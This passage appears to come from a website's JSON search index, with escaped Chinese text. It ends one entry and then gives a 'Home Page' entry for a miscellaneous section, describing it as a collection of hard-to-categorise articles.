\u7ed3\u675f\u8bed"},{"location":"misc/homePage/","text":"\u672c\u7cfb\u5217\u7684\u5185\u5bb9\u4e3a\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u5f52\u6863\u7684\u6587\u7ae0\uff0c\u6216\u8bb8\u4f60\u53ef\u4ee5\u5728\u5176\u4e2d\u770b\u5230\u4f60\u9700\u8981\u7684\u5185\u5bb9\u3002","title":"Home Page"}]}